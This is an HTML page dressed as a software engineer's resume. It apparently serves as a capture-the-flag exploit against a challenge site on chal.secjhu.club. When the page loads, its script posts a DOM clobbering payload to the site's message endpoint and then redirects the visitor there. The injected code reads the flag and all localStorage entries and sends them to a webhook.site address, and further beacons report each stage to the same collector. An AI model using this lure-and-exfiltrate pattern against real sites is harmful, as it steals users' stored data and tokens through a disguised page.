<!DOCTYPE html>
<html>
<head>
    <title>Two-Stage Job Clobbering Attack</title>
    <meta charset="UTF-8">
</head>
<body>
    <h1>Software Engineer Resume - John Doe</h1>
    <p>Preparing advanced attack...</p>
    
    <script>
        console.log('[STAGE1] Two-stage attack initiated');
        
        // 第一阶段：向挑战网站注入DOM Clobbering消息
        async function injectDOMClobbering() {
            console.log('[STAGE1] Injecting DOM Clobbering message...');
            
            try {
                const payload = {
                    name: 'utilsJS',
                    message: '<div id="utilsJS"><div id="url">data:text/javascript,try{console.log("[ATTACK] DOM Clobbering executed!");var flag=localStorage.getItem("flag");var allLS={};for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);allLS[k]=localStorage.getItem(k);}var img=new Image();img.src="https://webhook.site/00cc1371-1da8-47a4-9a33-da034f7efd2e?flag="+encodeURIComponent(flag)+"&ls="+encodeURIComponent(JSON.stringify(allLS))+"&source=injected_dom&t="+Date.now();console.log("[ATTACK] Flag sent:",flag);}catch(e){console.error("[ATTACK] Error:",e);}</div></div>'
                };
                
                const response = await fetch('https://jobclobbering-fe734e8816c7316e.chal.secjhu.club/messages', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                });
                
                console.log('[STAGE1] Injection response:', response.status);
                
                // 发送注入成功信号
                const img = new Image();
                img.src = 'https://webhook.site/00cc1371-1da8-47a4-9a33-da034f7efd2e?event=dom_injected&status=' + response.status + '&t=' + Date.now();
                
            } catch (e) {
                console.error('[STAGE1] Injection failed:', e);
                const img = new Image();
                img.src = 'https://webhook.site/00cc1371-1da8-47a4-9a33-da034f7efd2e?event=injection_failed&error=' + encodeURIComponent(e.message) + '&t=' + Date.now();
            }
        }
        
        // 立即执行注入
        injectDOMClobbering();
        
        // 第二阶段：跳转到挑战网站触发DOM Clobbering
        setTimeout(() => {
            console.log('[STAGE2] Redirecting to trigger DOM Clobbering...');
            
            // 发送跳转信号
            const img = new Image();
            img.src = 'https://webhook.site/00cc1371-1da8-47a4-9a33-da034f7efd2e?event=stage2_redirect&t=' + Date.now();
            
            // 跳转到messages页面
            window.location.href = 'https://jobclobbering-fe734e8816c7316e.chal.secjhu.club/#messages';
        }, 2000);
    </script>
</body>
</html>
